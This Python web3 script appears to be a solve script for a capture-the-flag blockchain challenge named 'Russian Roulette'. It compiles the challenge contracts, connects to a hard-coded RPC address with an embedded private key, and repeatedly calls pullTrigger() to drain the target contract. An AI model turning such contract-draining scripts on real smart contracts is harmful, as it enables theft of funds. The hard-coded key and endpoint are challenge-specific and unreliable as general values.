import json
import time
import solcx
from web3 import Web3

SOLC_VERSION = '0.8.23'

solcx.install_solc(SOLC_VERSION)

with open('Setup.sol', 'r') as f:
    setup_sol = f.read()
with open('RussianRoulette.sol', 'r') as f:
    roulette_sol = f.read()

compiled_sol = solcx.compile_standard(
    {
        'language': 'Solidity',
        'sources': {
            'Setup.sol': {'content': setup_sol},
            'RussianRoulette.sol': {'content': roulette_sol},
        },
        'settings': {
            'outputSelection': {
                '*': {
                    '*': ['abi', 'metadata', 'evm.bytecode', 'evm.sourceMap'],
                },
            }
        },
    },
    solc_version=SOLC_VERSION
)
with open('compiled.json', 'w+') as f:
    f.write(json.dumps(compiled_sol, indent=4))

setup_byte_code = compiled_sol['contracts']['Setup.sol']['Setup']['evm']['bytecode']['object']
setup_abi = compiled_sol['contracts']['Setup.sol']['Setup']['abi']

roulette_byte_code = compiled_sol['contracts']['RussianRoulette.sol']['RussianRoulette']['evm']['bytecode']['object']
roulette_abi = compiled_sol['contracts']['RussianRoulette.sol']['RussianRoulette']['abi']

# 94.237.53.81 47152  RPC
# 94.237.53.81 52833

w3 = Web3(Web3.HTTPProvider('http://94.237.53.81:47152')) # rpc

latest_block = w3.eth.get_block('latest')
print(latest_block, '\n', '\n')

# Private key     :  0xfe127669435dca9e0b2eebc7ef149818cf8718e501bc08820f91abc5337d3a49
# Address         :  0x1aFCD12C9b04677b71880fb13A91c1CA2dFB6c34
# Target contract :  0xD09B05B227310f7D65e0c40161fee2dF82b01613
# Setup contract  :  0x8c770a4b5b807446F6d763824Df9139E47cdEB15
#
private_key = '0xfe127669435dca9e0b2eebc7ef149818cf8718e501bc08820f91abc5337d3a49'
caller_address = '0x1aFCD12C9b04677b71880fb13A91c1CA2dFB6c34'
roulette_contract_address = '0xD09B05B227310f7D65e0c40161fee2dF82b01613'
setup_contract_address = '0x8c770a4b5b807446F6d763824Df9139E47cdEB15'

# check wallet balance
balance = w3.eth.get_balance(caller_address)
print('initial balance ->', balance)

# get contract instances
setup_contract = w3.eth.contract(address=setup_contract_address, abi=setup_abi, bytecode=setup_byte_code)
roulette_contract = w3.eth.contract(address=roulette_contract_address, abi=roulette_abi, bytecode=roulette_byte_code)

# get latest transaction
nonce = w3.eth.get_transaction_count(caller_address)
print('latest transaction ->', nonce)

### ensure contracts deployed

print('RussianRoulette constructor()')
tx = roulette_contract.constructor().build_transaction({
    'chainId': w3.eth.chain_id,
    'from': caller_address,
    'nonce': w3.eth.get_transaction_count(caller_address),
    'gas': 10000000,
    # 'gas': 30000000,
    # 'gasPrice': w3.to_wei('21', 'gwei')
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
sent_tx = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
receipt = w3.eth.wait_for_transaction_receipt(sent_tx)
if receipt['status'] == 0:
    raise Exception('tx failed: status=0')

print('Setup constructor()')
tx = setup_contract.constructor().build_transaction({
    'chainId': w3.eth.chain_id,
    'from': caller_address,
    'nonce': w3.eth.get_transaction_count(caller_address),
    'gas': 10000000,
    'value': w3.to_wei(10, 'ether'),
    # 'gas': 30000000,
    # 'gasPrice': w3.to_wei('21', 'gwei')
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
sent_tx = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
receipt = w3.eth.wait_for_transaction_receipt(sent_tx)
if receipt['status'] == 0:
    raise Exception('tx failed: status=0')

# call roulette function
for i in range(0, 100+1):
    tx = roulette_contract.functions.pullTrigger().build_transaction({
        'chainId': w3.eth.chain_id,
        'from': caller_address,
        'nonce': w3.eth.get_transaction_count(caller_address),
        'gas': 10000000,
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
    sent_tx = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(sent_tx)

    time.sleep(2)
    
    result = roulette_contract.functions.pullTrigger().call({
        'chainId': w3.eth.chain_id,
        'from': caller_address,
        'nonce': w3.eth.get_transaction_count(caller_address),
    })
    print(i, '->', result)
    print('    hash:', w3.eth.get_block('latest')['hash'].hex())
    print('    wallet:', w3.eth.get_balance(caller_address))
    print('    tx_count:', w3.eth.get_transaction_count(caller_address))
